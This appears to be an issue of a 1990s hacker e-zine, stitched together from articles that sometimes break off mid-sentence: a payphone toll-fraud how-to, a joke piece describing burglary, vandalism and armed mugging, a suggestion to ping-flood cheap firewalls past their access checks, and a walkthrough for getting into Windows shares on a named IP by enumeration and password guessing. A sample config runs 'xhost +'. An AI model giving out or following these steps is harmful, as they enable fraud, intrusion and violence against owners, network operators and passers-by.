THTJ Needs You!
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

	   Recently some of you out there have been saying what thtj needs to add
to its format. You say, but you do not act. THTJ is not just made by the thtj
staff, it is a zine made by the people, for the people. If you want to see
something added to thtj, then work with us on it. Do it. THTJ currently has
alot of matterial in it, but we have a serious shortage of phreaking articles
that are submitted to us. While hacking is more popular than even, and hacking
material is easy to come by, phreaking material is not. THTJ is working to
become a medium for phreaking information, but we can not do it with out you.
We urge you to help thtj and the underworld with phreaking materials.

	   THTJ also has a seriuos shortage of the following type of articles:

				    o NT Articles
				    o Phreaking
				    o UNIX Code
				    o Crypto
				    o VAX/Other OSes

The thtj staff is currently working to get articles on these subjects, but
we can not do it alone. Your submissions are critical. Your submissions are
*very* important to us. You help make this zine run.

Why write for thtj? Simple, thtj is one of the largest zines out there
covering hacking, phreaking, coding, crypto, etc. THTJ has recieved worldwide
coverage, and everyday thtj is reaching more people. Your name will be on
peoples minds after thtj has included one of your articles. After 2 or more
articles, you are eligable to be included on the thtj staff and receive some
goodies from thtj.com, information before anyone else has it, meet the

Microsoft is Scared
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

	   This month sees the release of Internet Explorer 4.0, and about a
million lawsuits that followed it. The Justice Department is cracking down
on Microsoft again, and Sun Microsystems is suing Microsoft for its use of
Java. However, all this should not be a surprize to anyone. Microsoft has
always practiced aggressive and unethical trade practices. And they did all
this for good reason with IE4. Microsoft is scared.
	   Why is the world's biggest company scared? They see the end of
Microsoft, if they do not act right now. The WWW and the internet explosion
took Microsoft by surprize. Look back 2 years ago, to the release of win95.
The Microsoft Network was the big thing when win95 first hit the streets.
MSN was very similar to AOL, everything was a new interface. Well, MS
dismissed the WWW as a temporary fad. Well, this blew up in MS's face. They
quickly released Internet Explorer 1.0 and 2.0, which were pathetic, when
compared to Netscape. Even in verison 2.0 however, MS was making MS only html
tags, and trying to get control of the HTML standard. With the new IE 4.0,
MS is only expanging this control. MS is trying to take over the internet's
most popular tool, the www. MS is also modding Java for obivous reasons. Java
is a *huge* threat to MS. Java means that programs are not only platform
independent, they are *OS* independent. MS has the control of the OS market,
and they do not want to lose this. They bought out Web TV for the same reason.
Web TV & Java == No need for a computer == No need for Microsoft. However, if
Microsoft gains control of Java and Web TV, they can make these work for them,
and they can gain even more of the population.
	   Microsoft will tell you that they are the innocent big boy that
everyone picks on, but this is pure bullshit. MS has always, and will always
practice 'aggressive marketing methods'. Example: making IE be included with
Win95 or, computer companies do not get Win95 for their machines. Example:
MSN is on the desktop in Win95, Standard. The list goes on. MS is nowhere near
innocent, they are guilty as sin. Do not feel sorry for them. Hell, do not
feel sorry for any multi-billion dollar company.
	   How can we stop MS from taking over the world? By mailing the
President. The Vice-President. Your Congressperson. Your Senator. The Press.
Anyone! This terror *must* stop, other wise we will not have a choice on
'Where we want to go today'

COCOTS
By shamr0ck, Special to thtj
shamr0ck@juno.com

Introduction..

Today I'm going to show you some fun stuff you can do with COCOTs. 
(Customer-Owned Coin-Operated Telephones). COCOTs are payphones owned by 
individuals and private companies. COCOT payphones have been around for many 
years. The reason COCOTs are really hitting the market is because of the 
money. COCOT owners get to keep about 85% of the profits, the rest goes for 
taxes, and trust me thats A LOT. By 1991, there were more than 30,000 COCOTs 
in the New York State alone. Just think of how many are in the rest of the  
country. Yes, it's a very big industry. Some COCOTs out there are served by 
AOS (Alternate Operator Service) companies, such as US Sprint, AT&T and MCI,
but they only serve them. Most COCOTs don't have their logo on them, although 
I have seen them on some. ALL COCOTs are required to provide a caller with 
access to the local exchange telephone company offering service within the 
area in which the call originates. Callers should be able to reach the long 
distance company of their choice by dialing 10xxx for AT&t, MCI, etc.

Things to do with a COCOT

You have to know what your looking for. COCOT payphones do not have any big
name phone company logos on them. You can usually find them in big hotels, 
inside and outside of restaurants, and a bunch of other places. So you have 
found a COCOT. "Now what the fuck do I do with it?" You get on the phone
and dial an 800 number and you tell them to fuck off. Then they hang up on 
you (don't call a telco 800 number or some fed office, dumbass). For about 
five secs you will hear a modem type sound. Yeah, thats the 1200bps modem 
inside the COCOT. After you hear that you should hear a dial tone. Now you
can dial out with out paying a cent. On some COCOTs you have to dial using a 
radio shack tone dialer ($25) because they disable the keypad when there's
no money in the coffer. "So I did that but it still doesn't want to work.
What do I do now?" Well if you tryed dialing out using both the keypad and 
the tone dialer you are out of luck. I have seen the new COCOTs around, and 
they really suck. You can't dial out because they deaden the handset. Never 
give up though, there are still a lot of old COCOTs around.

"Ok, I made a lot of calls using a COCOT. Who pays for it?"

The owner of the pay phone does..if you really like that COCOT you shouldn't
think you are 0-day (do not abuse the fraking cocot). If you abuse it you 
will:
1. Get cought.. they do get a phone bill and they do get the numbers you 
called on the bill..they are on the ESS.
2. The payphone will get taken away (make calls to france from N.Y. and talk 
for 10 hours a day; I think you know what I'm getting at)
3. Your mom will catch you and slap you around a bit with a large trout..

Good luck.

Phreaking Techniques
By KungFuFox, Executive Editor
kungfufox@thtj.com

Welcome to the wonderful world of phones! Do you wanna make phonecalls for
free?! Do you wanna have lotsa fun at the expense of somebody else?! Do you
wanna have a beigebox or a redbox, but don't even know what they are?! Read 
on k-rad kiddies! 

Lets start off with some basics, the kinda info you need to become a real
phreak like the big boys! You gotta learn how to get free phonecalls! Lets
start off with a pretty simple way, with a beigebox! I know you don't know
what that is, it doesn't matter, I'll tell you how it works! 

Basically you get a phone, and you plug it into somebody else's house instead 
of yours! Don't have a phone? No problem! My poor man's beigebox works just 
as well, and all you need to use it is a rock! Either one from your home or 
from the location of your victim is fine. Get to the victim's place, 
preferrably at night, and find a window to a room you think has a good chance 
of having a phone in it, and chuck the rock at the window. Make sure you're 
not standing right next to the window when you do this, because it's liable 
to break, granted you don't have two broken arms to throw rocks with. If you 
can find a neighborhood filled with deaf people, or a slum where people hear 
windows breaking regularly, this phreaking technique is much more likely to 
work.

Ok, now that the window is sufficiently removed, you need to get in there. 
Hopefully you picked a window that wasn't 10 feet off the ground. Climb on in 
there, making sure you don't peel the skin off your body, and look for a 
phone. Though you may be tempted, it isn't a good idea to turn on the lights
when you start looking for that phone, obviously because turning on the 
lights is a lot more suspicious than breaking a window. Now for the 
complicated part. 

Once you've located the phone, you have to use a special technique to use it, 
because ma bell designed phones so you can't beige box with them at normal
phone jacks. Rip the phone out of the wall, so that the plug on the end of 
the wire becomes separated from the wire. Bite off the plastic cover on the 
wire, and you'll see 2 or 4 wires inside it. You'll be dealing with the red 
and green wires. Strip away a couple inches of that colored insulation from 
those two wires. Now your beigehox is prepared for use. The only thing left 
to do is find a place to beige from. 

If this building you used your geolocial key to get into has a basement, 
you'll probably wanna go down there and look around for a plastic box mounted 
on a wall. It'll probably have a phone company insignia on it, most likely a 
generic bell shaped symbol, and a name with the word "bell" in it. Other  
possible names are "uswest", "ameritech", and "nynex". If this plastic box 
thing isn't in the basement, look around outside for it. It'll be on an 
outside wall somewhere around building. 

Once you find it, bash it good with your beigebox until it breaks open. You 
can use your feet and hands if you like. You could even use the rock you 
removed that window with if you can find it. Just make sure you bash the 
cover off that plastic box. Hopefully after all this work you'll be greeted 
with some screws in some strange geometric pattern. Hold the beigebox's 
handset up to your ear so you can hear it if it gets a dailtone, and start 
touching the red and green beigebox wires to different screws. After a few 
minutes if you don't have a dialtone, you're either retarded or the phoneline 
is disconnected. In the latter case, you'll need to goto another building,
find another plastic box with a phone company insignia on it, and try the 
same procedure there. If you're just retarded, bash yourself in the head with 
the beigebox. It's probably angry at you anyway, for ripping it out of the 
wall. 

Another good way to make free phonecalls, and become an elite phreak, is to
redbox. Don't know what a redbox is either? No sweat! I'll tell you how to
get free calls just like a redbox does, but without the time consuming 
construction! 

First things first, you need to find a payphone. Any payphone will do, so 
long as it works. Don't believe any of the undercover telco people on irc 
that may tell you redboxes don't work. They do! Once you've found yourself a
payphone, you need to get to get money to use it. Ha! I didn't mean your own
money! That wouldn't be free! My first technique is something I'll call 
begging.

To beg successfully, you'll need to look shabby. Don't shave if you're old 
enough that shaving matters, and don't comb your hair or whatever it is you
normally do to it. Also, your worst clothes, slept in the night before your
first redboxing day, is a good idea. Bring along a disposable cup, you can
find one on the way if you need to, and go to that payphone. Now, when people
walk by it, or walk up to use it, they're probably gonna have some change.
Just sit there looking real pathetic and people are bound to start dropping
as few coins as they can into your cup. Don't worry, even though they're 
cheapasses, eventually those small donations to your personal charity will 
add up. Once you've got like five bucks, you can start making calls, and they
won't have cost you any money at all! 

My second technique, which is a much more effective method of obtaining 
funds, is something I like to call mugging. This will take some patience 
though, for you need to find the weakest person possible before attacking. 
Preferrably you should find somebody who wieghs a lot less than you do. Once
you've found your anonymous donor, you may either knock them down, or simply
grab them. Weapons such as guns and knives are excellent when implimented
properly, to terrify your victim into submitting to your demands for money.
Once you've acquired the funds that you feel are necessary to support your
need to make free phonecalls, and become a better phreak, you may let them 
go, and get yourself to a phone, to start using that money.

Ok now that you've acquired a couple tricks of the trade, get your lazy ass
out there and phreak!


ÍÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÍ         04 of 16
Basics of Telephony 
By AlienPhreak

Surprisingly enough most phreakers don't even know the real basics of the 
telephone system. This article will outline the following features:

POTS
Trunks
The Switching System
PBXs (PABXs)

The Plain Old Telephone System (POTS):
	
The main part of the POTS is the actual telephone. The telephone requests 
network access by using a signalling method called loop start. When the 
telephone starts its session it's called "off hook" voltage, indicating the 
voltage being sent from the switch or CO through the 2-wire connection 
(red and green wires). Of course when you don't pick up the receiver the 
phone is on hook.

When the telephone receives a call the network (switch) gives ring voltage 
out to the telephone (90 VAC over the DC voltage). Then you get those happy 
rings and you pick up the phone. For the phone to dial out you need a type of 
signaling. Before Dual Tone Multi-Frequency (DTMF), there was good ol' rotary 
or pulse dialing. DTMF is pretty much the standard these days on most 
switching systems. Pulse Dialing is still used in some areas. 

Another Signaling method is MF or Multi-Frequency. Like DTMF, MF is used on a
few types of trunks and CCITT signaling. If you know anything about the old 
Blue Boxes, they used the KP, ST, R1-R2 signals, et cetera, which are 
actually MF signaling. 
	
Now the tricky part is converting speech into electrical signals. For the 
switching system to change your voice into signals, it uses Transmit Loudness 
Objective Rating (TLOR). For you to receive the signals the switch then sends 
out Receive Loudness Objective Rating (RLOR).

Central Office (CO):

In many phreaking articles you will see the acronym CO, which of course 
stands for Central Office. The CO is pretty much the center of all the local 
phone networks. It connects you to the rest of the world and all the other 
switches. The CO is a physical facility where all of the networking and 
routing switches are physically held. The trunks are what call the other 
trunks within other COs (where the trunk directs or "routes" your call 
depends on where you are calling to). There is no main purpose of the CO 
besides housing all of the computers, trunks, and line-cards associated with
the local network.  

The Switching System:

The first major independent switching system was Step-by-Step (SxS) 
switching. SxS was run by electro-mechanical switches. It is now a rather 
archaic system but is still used in some places. Dial pulses would be used to 
cause the switches to select switch groups until the full number was dialed. 
Crossbar Switching (XB) was the next electro-mechanical switching system to 
come into play. The XB system was set up much differently than SxS. It used a 
matrix of connectors arranged in a grid to form its connection scheme. 
	
ESS was the first non-mechanical switching system. It provided many more 
features than the basic calling system of SxS. ESS could handle both pulse 
dialing and DTMF signaling. The main ESS, which used the 1A processor, was
easily upgradable to 1ESS. The processor also controlled 4ESS, allowed it to 
be easily upgraded, and ran in real time. 5ESS is almost the "industry 
standard switch" of today, and is far superior to Nortel's DMS switches. The 
5ESS is manufactured by AT&T and is used by almost every RBOC (Regional Bell 
Operating Company). The 5ESS's are almost entirely unix based, though it is 
very different from the unix systems you or I run. It has many more features 
and is set up by AT&T for their routing and channeling.

Private Branch Exchanges (PBXs):

The PBX is almost like a miniature switch. It controls a small area like a 
business or a school phone system. The point of a PBX system is for companies 
to use as few telephone lines as necessary to get the most out of their 
telecommunications budgets. If you have 100 people and 100 phones, the fact 
is not all 100 people are going to be using the fones at the same exact time. 
PBX systems provide switching of in-house calls, and "pool" the outside 
lines.
	
There are many functionalities of the PBX, such as paging systems and voice 
mail boxes (VMBs). There are many neat things a phreaker can do to with a 
PBX. Some PBXs are set up so that someone can call in and they will get an 
automatic dial tone. After that they enter a code and the user is allowed to 
dial out, with the call being billed to the company that owns the PBX. Of 
course this can be abused, along with the VMB.
	
PBX networking can be very complex. I will only cover one type of Switched 
Services Network (SSN). An Electronic Tandem Network happens to be what my 
private school phone system uses. It's set up in the manner that all lines
(extensions) have a three digit address. Automatic routing can take place 
within the private network. This SSN is setup on a privatly owned trunk so 
that the company or school can set it up however they would like. 

Trunk Signaling:

Due to time constraints I can only talk about one type of trunk signaling, 
the Single Frequency (SF). SF signaling is used on all 4 wire analog systems. 
SF is a type of 'inband' signaling scheme where all information is 
transmitted in the voice band. SF uses 2600hz and 2280hz signals to transmit 
data. When the trunk is in an on-hook state the 2600hz or 2280hz tone is used 
to connect to the remote site. When the trunk is in an off-hook state the 
2600hz or 2280hz tone is dropped. SF units can pass dial pulse address 
signaling at speeds from 8 to 12 (pulses per second) PPS with 56 to 69 
percent break. 
*2280hz is only used in British Telecom's trunks.

This concludes my article on the basics of the telefone system. If you see

Basic Firewalls
by Onyx


Part1
	
	I am writing this article to basically confirm and dispell ideas
	   about firewalls. The first section is for people who just want the
	   jist of what a firewall is the second section is more technical Most
	   people ,espescially hackers, consider firewalls a very big threat and
	   make them to be something they are not. First lets define one in the
	   simplest terms. A firewall is a computer sitting between your network
	   and the Internet that runs special software to keep people out. That's
	   it in the simplest terms. Firewalls can be configured in several ways
	   and doesn't have to be on a seperate computer that only runs the
	   firewalls software. Lot's of times a so called "poor man's firewall"
	   can be configured by using a computer that is also used for other
	   applications. Most of the time a firewall setup looks something like
	   this (forgive the crude drawing)

							 >
Network-------Web Server----Firewall>----Internet or
							 >

				  >              
Network-------Firewall>-----Webserver----Internet
				  >

	In the first example everything is behind the firewall, thus
	   theoretically your network and web server are behind the firewall. In
	   the second example your web server is vulnerable to attack, but even
	   if you manage to breach the web server's security to get to the
	   Network you still need to get past the firewall. The second
	   configuration I consider more safe although others will argue
	   differently (it is sometimes referred to as the "sacrificial lamb"
	   configuration because you are "sacrificing" your web server).

	Getting back to what a firewall does. A firewall is designed to block
	   access to certain things. Most of the time this is based on domain,
	   which leads to one insecurity which I will get to later. As an example
	   lets use the site, secure.com. Say secure.com decides to setup a
	   firewall that denies access to port 23 (telnet) to everyone except to
	   those who are apart of a certain domain. Now most of the time
	   companys are too cheap and don't want to pay for expensive firewall's.
	   So to get access the easiest way is to ping the firewall so it gets
	   too lagged to check who you are and just drops to the desired service.
	   This ONLY works for cheap firewalls. Some sites who know nothing of
	   computer security and assume someone trying to break into their site
	   know virtually nothing also (idiots) have tried to setup stupid "fake"
	   firewalls. I ran into a site which will remain anonymous that to ,
	   deter hacking attempts, said on the login screen that this was
	   something something firewall blah blah blah. Well anyway it        wasn't a firewall and they were just trying to scare people into
	   thinking it was so hackers would leave their site alone...didn't work
	   for me =) So trying not to get to technical here, a firewall that
	   checks access to a service through domains can be spoofed. If you
	   would like to know about spoofing their are plenty of articles out
	   there for you to read.

Section 2
	
	People who are interested in more technical details read on:

	This will be a more in-depth description of a firewall. People throw
	   the word firewall around a lot and don't know exactly what constitutes
	   one and what kinds their are. Most firewalls are screening routers.
	   They provide packet filtering and work with the lower level of the
	   network protocol stack. Another type is known as a proxy server
	   gateway (I know it sounds imposing). They preform basic proxy
	   services for external networks for internal users. These actually
	   look at the data INSIDE packets. And finally the third type uses what
	   is known as a stateful inspection technique. Firewalls are most often
	   built ontop of routers and routers intern are used with gateways
	   offering high-end protection. Here is another crappy diagram which
	   depicts a screening router NOT a proxy server!




				|
Internet----------->|----------       |
	  <------------|----------User   |=Screening Router
							|

	A proxy server looks SIMILAR, but not EXACTLY the same. Instead of
	   just some simple uncomplicated software proxy servers are actual
	   computer(s) that run ONLY special proxy software.

	Another thing I would like to point out about firewalls are that they
	   are basically a newly *implemented* technology. The technology ,
	   however, has been around for a while. Since the implimentation of the
	   TCP/IP protocol. All that was required to develop them was some smart
	   thinking. One of the recent developments was allowing video and audio
	   conferences through firewalls. Before to allow this people had to
	   setup the firewall so that it didn't utilize it's full potential for
	   protection. When a person decides that they want a firewall they have
	   to decide what services they want to offer. I know this will sound
	   stupid, but u CAN setup finger to work through a firewall. Now I
	   don't know exactly why you would want this except if you wanted your
	   users and every other person on the net to know who is currently
	   logged onto your network. Some of the services you can use through a
	   firewall are:

				 Telnet
				 FTP
				 HTTP
				 Finger (sigh)
				 Gopher-Archie

Their is one more. X. Now I know those of you who are familiar with X
security will be plotting in your evil little minds now (hehehe). Well anyway
if you aren't familiar with X what you should at the very least know is that
it is very insecure. One of the major problems with it is that users can
monitor your keystrokes. In some instances you can ,over a telnet proxy,
start a virutal x server.

X?
By ³ntertia, Special to thtj
inertia@webzone.net

	In general, when one thinks of an operating system that has a
graphical user interface, one thinks Microsoft Windows, not the X Windows
System.  This person is missing out.  Here, I will attempt to explain X
and it's counterparts, such as the XFree86 Project... along with with many
examples of why X is better than everything else.  My technical experience
is limited to Linux, so XFree86 and how to successfully implement it on
your OS  will be the bulk of this article.
    So what exactly is "XFree86?"  XFree86 is the focus of the XFree86
project, developed to provide  a GUI for Linux, OpenBSD, and OS2, among
many others.  X along with a good window manager (a window manager
provides the GUI and sets the level of configuration for your
environment, along with providing you a means of control) makes Windows 95
look like total crap.  X has yet to reach the level of user-friendliness
that Windows has, but hell, we're talking about Linux here, not DOS.  When
you get familiar with X then that Win95 partition is outta here.  ;]
Enough background and opinions, let's take it to another level, shall we?
	So now that you know about X... it's time to pay attention to where it
lies in your HDD.  (From now on we're talkin Linux only, X11R6, the current
version)  X is drawn from /usr/X11R6 to make it simple, this is where X and
all of it's accessories, games, etc. are located.  This makes X easily
accessible, since it's not thrown into other directories, e.g.
/usr/X11R6/bin instead of /bin.  Now that the general location has been
determined, you might wonder which files are important or which files do
what on your system.  Keep reading.
	X, like anything else, has proprietary commands, that cannot be
successfully executed without an X display open.  If you are new to
linux, at the shell prompt type startx to begin an X session, or if you
prefer an X login prompt to skip over multiuser mode completely then
edit the initial runlevel to 5 in /etc/inittab.  To change video card
settings etc, run the command Xconfigurator in a shell or in X itself.
Sorry if the instructions are vague but the intention of this is not to
show you how to run X, but to explain in an understandable manner the
unique attributes and advantages of the system and provide general
information on how to
better understand how it works.  You cannot, of course, open Netscape while
inside a shell... you can inside of an Xterm in X (an Xterm is simply a
shell emulator that is run through X) but otherwise it is impossible.
Naturally, these proprietary commands are all GUI programs, but many are
very powerful.  Now is the time that I could go into the people who say
they hate Windows because it's the cool thing to say, haha, but I at least 
have valid reasons for picking X over Windows any day.  Don't be stupid and
think that just because you are provided a GUI, the program is weak,
because, well, you would be wrong.  For example, there is an XFree86 driven
kernel hacker, Xconfig.  If you run X, next time you recompile your kernel
type make xconfig instead of make config.  The organization of the XFree86
system and it's identifying commands have been mentioned, now we will look
at how it comes together.
	Upon startup, the .xinitrc file is read.  Here is my .xinitrc:

#!/bin/sh

# Turbo Linux XINITRC by Scott Stone (sstone@turbolinux.com)

userresources=$HOME/.Xresources
usermodmap=$HOME/.Xmodmap
sysresources=/usr/X11R6/lib/X11/xinit/.Xresources
sysmodmap=/usr/X11R6/lib/X11/xinit/.Xmodmap

# merge in defaults and keymaps

if [ -f $sysresources ]; then
    xrdb -merge $sysresources
fi

if [ -f $sysmodmap ]; then
    xmodmap $sysmodmap
fi

if [ -f $userresources ]; then
    xrdb -merge $userresources
fi

if [ -f $usermodmap ]; then
    xmodmap $usermodmap
fi

#
# Programs & Window Managers

#xsetroot -solid gray7 &
#xterm -T 'Login Shell' -ls &
#xbiff -update 5 -geometry +5-5 &

# Uncomment this line if you want other machines to be able
# to open windows on your machine (by default):

xhost +

# Start up a window manager - only one of these lines should be
# un-commented.
afterstep
#fvwm
#fvwm95-2
		
EOF

The file in itself keeps things nice and simple... as you can see, it sets
the paths to a couple of other initialization files, reads them (.Xmodmap
and .Xresources), provides you with an option to let others access X on
your computer, and then looks for a window manager to start up with.  Along
with these initial functions, the window managers have their own
initialization files to be read.  To go into that would be overkill at this
point.  The system has been configured and all ready to start up... but
what happens when it is not successfully run?  Next we will go into common,
even frequent, errors that you will most likely face at some point in time.
	One of the simplest problems to overcome is an improper video card or
color/resolution specification.  This can be fixed by running Xconfigurator
or simply passing arguments to the command line, such as startx -- -bpp 24,
which will start X in 24 bit color mode, replace 24 with 8, 16, etc. to
meet your own needs.  Invalid settings have, personally, caused 90% of the
problems that I have with X.   A common error message for this is "server
is already running, blah blah blah."  Another error is "unable to access
security policy etc."  That, I have heard, is a bogus message in some
versions of X11R6, and can be fixed most easily through re-installation, if
you can call that easy maintenance.  
	In conclusion, X is a durable, and surprisingly enough, easy to use
system.  The level of control you have over is amazing to the typical
Windows user, and is well worth the time to check out.  I would like to go
into higher detail, but I don't really have the time to write such a large
document at once that would include color tables, a little source, and VERY
cool feature, hosting X applications to a remote user.   If you have any
suggestions to a good continuation to this article feel free to email me.
Peace...

Windows File Sharing Basics
By Chameleon, Special to thtj
Chameleon@intercore.com.ar

Now to you nt gurus this is all very basic but since most of you are unix
hackers you probably dont know shit about windows. It is a must to start
learning windows now. NT is getting big. More and more each day people are
starting to use it. Yes I agree I hate NT and love a good ol unix box but we
must keep up with technology. NT is widely used even by places like the
Pentagon. (*caugh*it was easy to hack*caught*) Ok class lets start...


Say you have an IP address that you want to try and get access to you would
do this

Example for IP address: 194.8.235.73
Note: Use IP addresses because the name address sometimes wont work and the
IP will so use IP addresses.
 
Drop to dos:
c:\windows> nbtstat -A 194.8.235.73

	  NetBIOS Remote Machine Name Table

   Name               Type         Status
---------------------------------------------
MAILGATE       <00>  UNIQUE      Registered
MAILGATE       <03>  UNIQUE      Registered
MAILGATE       <1F>  UNIQUE      Registered
MAILGATE       <20>  UNIQUE      Registered
..__MSBROWSE__.<01>  GROUP       Registered
MIRAGE         <00>  GROUP       Registered
MIRAGE         <1D>  UNIQUE      Registered
MIRAGE         <1E>  GROUP       Registered

MAC Address = 00-00-00-00-00-00

----------------------------------------------------------------------------
|Note: this will list the remote hosts name. The name is set in the | 
|control pannel/networking/indentification/computername.            |
----------------------------------------------------------------------------

Now that you have the computer name you need to tell windows the IP that maps
to that computer name.  So to do this you need to edit c:\windows\lmhosts
open it in notepad or whatever. It will look like this...

127.0.0.1       localhost
 
you want to add the ip 194.8.235.73 and then press tab and enter the
computer name. so the new hosts file will look like this. 

127.0.0.1       localhost
194.8.235.73   MAILGATE

This sets up a computer name mapping to the IP address of the computer to try
and get into its filesharing. Save this and then click your Start Button then
goto find, then computer, then enter the computer name and it will connect to
that computer name that you added into the hosts file. It should show the
computer as being found. Double click it and then if your lucky it wont have
a password but if you arent you will be prompted for a password which you
will have to try and guess or use a brute force cracking program.


Hope this was a little help. If not at least you know how to use windows file
sharing...

Anyone good at codeing in windows? Wana code a brute force hacking program
for windows file sharing? E-Mail me.

 : I. Introduction              ³
 ú-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

 Computers are insecure things. You and I both know that. And, In 1969 so
 did the fine people at Bell Labs, who coded UNIX. Thus, UNIX needs to be
 able to authenticate you before it can let you proceed. When you log into
 any system, you enter a user name and password. These two things are used
 to see if you are who you say you are. However, these are not the only
 ways that you can be authenticated, and passwords can be stored in other ways
 than just the good old /etc/passwd file. Before PAM, if you were to adopt a
 system of authenication, you would have to recompile every single one of your
 programs to support the authenication. Hence, may sysadmins did not use
 alternate methods of authenication, and that is why it is so easy for you
 and I to get into systems.


 Enter PAM. PAM stands for 'Pluggable Authenication Modules' , and it is a
 way of allowing a sysadmin to set up authenication on programs and services
 on their system with out having to recompile everything. With PAM, you are
 able to edit a configuration file, and easily control the module. The idea
 behind PAM was created by both Vipin Samar and Roland J. Schemers, who
 released their ideas in DCE-RFC-86.0 (rfc86.0.txt, see References on where
 to get a copy of it) in October 1995. Both Samar and Schemers worked for Sun
 Microsystems, but to date, the only UNIX version that really supports PAM is
 Linux, and in particular Red Hat linux, who has used PAM since Red Hat 3.0.4.
 In Solaris 2.5 PAM was partically implemented, and in  Solaris 2.6, it is
 expected to be fully functional.

 If you are running a version of Rad Hat after 3.0.4, then you have been
 using PAM and may not have known about it, since Red Hat's RPM package
 manager automatically handles the changes to PAM if a package you install
 requires it.


 Ú--ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
 : II. Modules                  ³
 ú-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

 There are 4 types of modules defined in the PAM standard.

	   auth: provide the actual authenication (ie. asking for and checking a
		    password, and setting 'credentials' like groups, or creating a
		    kerberos 'ticket')

	account: check to see if authenication is allowed, the account has not
		    expired or been deleted, the user is allowed to log in, etc.

    password: used to set passwords

	session: used once a user has successfully been authenicated to make it
		    possible to actually use there account, and mount their home
		    directory, or mail their mail available, etc.
 
 Modules are made to be 'stacked' so that multiple modules can be used. For
 example, rlogin normally makes use of at least 2 authenication methods: it
 firsts used rhosts authenication, and if is succeeds, the connection is
 opened, if not, standard password authenication is done.

 New modules can be added at any time, and PAM aware applications can be
 then made to use them. For example, if you use a one-time-password system for
 something, then you can easily make a module to support it, since
 documentation for writing modules are included with the system, and PAM aware
 programs can use the new module and use the one-time-password system without
 recompiling or modifing in anyway.

 Here is a list of the modules that people are using/developing for use with
 Linux-PAM:

 The point of having modules is that you can just plug them in(!) In
 other words, they do not need to be compiled with the Linux-PAM library to
 work. Here are some alternative sources for modules that are being provided
 independently of the main library:

 - Thorsten Kukuk has produced a pam_keylogin module for NIS+ support. 
   ftp://weber.uni-paderborn.de/pub/linux/NIS/

 - David Airlie has produced a module that validates a username/password
   combination using an NT server, it allows for domain validation.
   http://www.csn.ul.ie/~airlied/pam_smb/

 The following modules are (mostly) to be found in the Linux-PAM source tree:

 ú-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

 A quick note about services. Each program that uses PAM defines its own
 service name. The login program defines the service type login, ftpd defines
 the service type ftp, and so on. In general, the service type is the name of
 the program used to _access_ the service, not the program used to _provide_
 the service. (The ftpd being defined as ftp is an example.)

 : IV. Configuration Files      ³
 ú-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

 The directory /etc/pam.d is used to configure all PAM applictions. Earlier
 PAM versions used to use /etc/pam.conf, but that file is now only read if
 no /etc/pam.d/ entry is found. Each application (service) has its own file.
 A file might look a little something like this:

			( this is tghe file for the basic login 'service' )
 #%PAM-1.0
 #Module Type   Control Flag  Module Path               Options
 #-----------   ------------  -----------               -------

 auth           required  /lib/security/pam_securetty.so
 auth           required  /lib/security/pam_pwdb.so      shadow nullok
 auth           required  /lib/security/pam_nologin.so
 account        required  /lib/security/pam_pwdb.so
 password       required  /lib/security/pam_cracklib.so
 password       required  /lib/security/pam_pwdb.so   shadow nullok use_authok
 session        required  /lib/security/pam_pwdb.so

 The first 3 lines, are of course a comment. The next 3 lines stack up 3
 modules for use to login authorization. The first line makes sure that if
 the user is trying to log in as root, the tty they are logging in is listed
 in /etc/securetty, if the file does exist. The second line causes the user
 to be asked for a password and to then check the password. The third line
 then looks to see if the file /etc/nologin exists, and if it does, displays
 the contents of the file, and then boots off the user if it is not root.

 Note that all three of these modules are checked, _even if the first module
 fails_. This was built in as a security precaution. If a user (read: hacker)
 knew why the authenication failed, then they might be able to figure out how
 to get around the problem and break the authenication easily. If you want to
 change this, you can change 'required' to 'requisite', since if a requisite
 module fails, PAM immediately and does not call the other modules.

 The line after that (line 7) checks and causes any necessary accouting to be
 done. (i.e. if shadow passwords have been enabled, the pam_pwdb.so module
 would check to see if the account has expired, of if the user's password
 has expired and needs to be changed.)

 Line 8 then specifies that if the login changes the users password, it should
 use pam_pwdb.so to do it. This will only occur if the auth module determines
 that the password needs to be changed, for example, if the shadow password
 has expired.

 The last line then goes on to specify that pam_pwdb.so should be used to
 manage the session. Currently, that module does not do anything, but it could
 be replaced, or supplemented by stacking a module or two.

 Note that the order of the lines matters. While it may not matter for the
 order of the required modules, it matters for the other control flags
 available for use. sufficent and requisite cause order to be important, as
 does optional, which is a flag that is rarely used. For an example of this,
 turn to your rlogin auth configuration, which should look something like:

 auth   required     /lib/security/pam_securetty.so
 auth   sufficent    /lib/security/pam_rhosts_auth.so
 auth   required     /lib/security/pam_pwdb.so shadow nullok
 auth   required     /lib/security/pam_nologin.so

 Now, this file looks almost like the login entry, the extra line and the
 sufficent make the order of the modules important.

 First off, pam_securetty.so keeps root from loging in on insecure terminals,
 which quite effectively prevents rhost root logins. If you wish to allow them
 you can simply remove that line.

 Second, if pam_rhosts_auth.so authenticates the user, then PAM skips the
 password checking, otherwise if it fails, then the failed authentication is
 ignored. If pam_rhosts_auth.so fails to authenicate the user, then
 pam_pwdb.so is used to do normal password authentication.

 Finally, pam_nologin.so checks /etc/nologin.

 Note that if you do not want to prompt for a password if the securetty checks
 fail, then you can modify pam_securetty.so from required to requisite.

 : V. Shadow Passwords          ³
 ú-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

 A quick note for Red Hat users, if you wish to use PAM and shadow passwords,
 you are in luck. pam_pwdb.so can support shadow passwords. To convert your
 system for shadow passwords, use the following commands:

			 cd /etc
			 pwconv5
			 chmod 600 passwd- shadow-

 pam_pwdb.so will automatically detect that you have implemented shadow
 passwords, and it will make all the adjustments necessary.

